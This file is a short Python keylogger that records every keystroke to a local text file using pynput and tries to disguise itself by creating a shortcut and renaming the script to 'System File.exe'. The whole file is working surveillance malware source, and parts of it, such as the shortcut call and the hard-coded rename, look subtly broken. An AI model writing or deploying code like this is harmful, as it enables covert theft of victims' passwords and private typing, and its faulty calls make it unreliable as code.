import os
import time

def log_keystrokes(key):
    with open('keylog.txt', 'a') as file:
        file.write(f'{key}\n')

def hook_keyboard():
    import pynput.keyboard as keyboard
    from pynput.keyboard import Key, Listener
    
    def on_press(key):
        try:
            log_keystrokes(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                log_keystrokes(' ')
            elif key == keyboard.Key.enter:
                log_keystrokes('\n')
    
    with Listener(on_press=on_press) as listener:
        while True:
            time.sleep(10)

def hide_file():
    import winshell
    shortcut = winshell.CreateShortcut(
        {'Path': os.path.abspath(__file__), 'Target': f'"{os.path.abspath(__file__)}"', 
         'IconLocation': f'{os.path.abspath(__file__)}', 'Description': 'Keylogger'})
    shortcut.save()
    os.rename('keylogger.pyw', 'System File.exe')
    
if __name__ == '__main__':
    hide_file()
    hook_keyboard()
